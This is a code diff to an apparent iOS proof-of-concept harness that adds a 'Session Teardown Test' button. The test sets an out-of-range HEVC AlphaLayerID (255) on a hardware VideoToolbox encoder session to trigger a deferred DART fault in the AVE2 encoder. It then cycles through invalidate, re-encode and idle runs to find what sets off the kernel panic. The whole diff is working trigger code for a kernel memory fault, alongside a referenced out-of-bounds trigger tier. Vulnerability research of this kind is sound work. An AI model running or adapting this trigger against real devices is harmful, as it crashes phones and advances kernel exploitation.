@@ -2487,6 +2487,209 @@ static void runPhase2_Boundary(void) {
 }
 
 // ============================================================
+// Phase 2E-0: Session Teardown Test
+// Determines whether the deferred DART fault is triggered by:
+//   A) Session invalidation/teardown
+//   B) Next encode on same session
+//   C) Idle timer (existing baseline)
+// ============================================================
+
+static int g_teardownRunIdx = 0;
+
+static void runPhase2_Teardown(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    int runType = g_teardownRunIdx % 3;
+    g_teardownRunIdx++;
+
+    NSString *runLabel;
+    switch (runType) {
+        case 0: runLabel = @"A: Immediate Invalidate"; break;
+        case 1: runLabel = @"B: Clean Encode on Same Session"; break;
+        case 2: runLabel = @"C: Idle Baseline (120s)"; break;
+        default: runLabel = @"?"; break;
+    }
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  PHASE 2E-0: Session Teardown Test       ║");
+    pocLog(@"║  *** CAN CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+    LOG(@"Run type: %@", runLabel);
+    LOG(@"Cycle: press Teardown 3x for A→B→C");
+    pocLog(@"");
+
+    // Canary
+    LOG(@"--- CANARY: AlphaLayerID=0 ---");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK — encoder healthy.");
+    idleWait(10, @"canary cooldown");
+
+    // Create session and trigger the -17691 error WITHOUT invalidating
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = @"teardown-trigger";
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        CVPixelBufferRelease(pb);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        g_phase2Running = NO;
+        return;
+    }
+
+    LOG(@"*** ENCODING WITH AlphaLayerID=255 ***");
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d (%s)", (int)status,
+        status == noErr ? "submitted" : "error");
+
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    [NSThread sleepForTimeInterval:2.0];
+
+    BOOL ok = g_narrowGotOutput;
+    INFO(@"Callback output: %@ (expect NO for -17691 path)", ok ? @"YES" : @"NO");
+    CVPixelBufferRelease(pb);
+    pocLog(@"");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss";
+
+    switch (runType) {
+        case 0: {
+            // Run A: Immediate session invalidate, then short wait
+            LOG(@"=== RUN A: IMMEDIATE SESSION INVALIDATE ===");
+            LOG(@"Invalidating session at %@", [fmt stringFromDate:[NSDate date]]);
+            INFO(@"If panic fires in next ~30s → descriptor fires on teardown.");
+            pocLog(@"");
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            session = NULL;
+
+            LOG(@"Session invalidated at %@. Waiting 60s...", [fmt stringFromDate:[NSDate date]]);
+            idleWait(60, @"post-invalidate DART window (Run A)");
+
+            PASS(@"=== RUN A: SURVIVED 60s post-invalidate ===");
+            INFO(@"Teardown did NOT trigger the fault immediately.");
+            INFO(@"Next press: Run B (clean encode on same session)");
+            break;
+        }
+        case 1: {
+            // Run B: Encode a clean frame on the SAME session, then wait
+            LOG(@"=== RUN B: CLEAN ENCODE ON SAME SESSION ===");
+            INFO(@"Session still alive. Encoding with AlphaLayerID=0...");
+            INFO(@"If panic fires → descriptor fires on next-use/flush.");
+            pocLog(@"");
+
+            CVPixelBufferRef pb2 = createTestPixelBuffer(320, 240);
+            if (pb2) {
+                g_narrowGotOutput = NO;
+                g_oracleContext = @"teardown-clean";
+                OSStatus encStatus = VTCompressionSessionEncodeFrame(session, pb2,
+                    CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                INFO(@"Clean encode: %d (%s)", (int)encStatus,
+                    encStatus == noErr ? "submitted" : "error");
+                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+                [NSThread sleepForTimeInterval:2.0];
+                INFO(@"Clean encode output: %@", g_narrowGotOutput ? @"YES" : @"NO");
+                CVPixelBufferRelease(pb2);
+            } else {
+                FAIL(@"Could not create pixel buffer for clean encode");
+            }
+
+            LOG(@"Clean encode done at %@. Waiting 60s...", [fmt stringFromDate:[NSDate date]]);
+            idleWait(60, @"post-clean-encode DART window (Run B)");
+
+            PASS(@"=== RUN B: SURVIVED 60s post-clean-encode ===");
+            INFO(@"Next-use did NOT trigger the fault.");
+            INFO(@"Next press: Run C (idle baseline)");
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            session = NULL;
+            break;
+        }
+        case 2: {
+            // Run C: Leave session alive, just idle (baseline comparison)
+            LOG(@"=== RUN C: IDLE BASELINE (session alive) ===");
+            INFO(@"Session NOT invalidated. Pure idle wait 180s.");
+            INFO(@"If panic fires → idle timer / power-state trigger.");
+            pocLog(@"");
+
+            idleWait(180, @"idle DART window with live session (Run C)");
+
+            PASS(@"=== RUN C: SURVIVED 180s idle ===");
+            INFO(@"Now invalidating session...");
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            session = NULL;
+
+            LOG(@"Session invalidated. Waiting 60s post-invalidate...");
+            idleWait(60, @"post-invalidate after idle (Run C)");
+
+            PASS(@"=== RUN C: SURVIVED 60s post-invalidate too ===");
+            INFO(@"Cycle complete. Press Teardown to restart A→B→C.");
+            break;
+        }
+    }
+
+    if (session) {
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+    }
+
+    pocLog(@"");
+    INFO(@"RESULT: Run %@ completed without panic.", runLabel);
+    INFO(@"Record result. Compare A/B/C panic rates to identify trigger.");
+    pocLog(@"");
+
+    g_phase2Running = NO;
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -2965,7 +3168,22 @@ static void runTier2Probe(void) {
     [boundBtn addTarget:self action:@selector(runBoundary) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:boundBtn];
 
-    CGFloat logTop = row5 + btnH + gap;
+    // Phase 2E buttons — row 6: teardown test
+    CGFloat row6 = row5 + btnH + gap;
+
+    UIButton *teardownBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    teardownBtn.frame = CGRectMake(pad, row6, w - pad * 2, btnH);
+    teardownBtn.backgroundColor = [UIColor colorWithRed:0.5 green:0.1 blue:0.0 alpha:1];
+    teardownBtn.layer.cornerRadius = 8;
+    teardownBtn.layer.borderWidth = 2;
+    teardownBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.5 blue:0.0 alpha:1].CGColor;
+    teardownBtn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
+    [teardownBtn setTitle:@"2E-0: Teardown Test (A→B→C cycle)" forState:UIControlStateNormal];
+    [teardownBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.5 blue:0.0 alpha:1] forState:UIControlStateNormal];
+    [teardownBtn addTarget:self action:@selector(runTeardown) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:teardownBtn];
+
+    CGFloat logTop = row6 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -3065,6 +3283,12 @@ static void runTier2Probe(void) {
 - (void)runBoundary {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runPhase2_Boundary();
+    });
+}
+
+- (void)runTeardown {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runPhase2_Teardown();
     });
 }
 
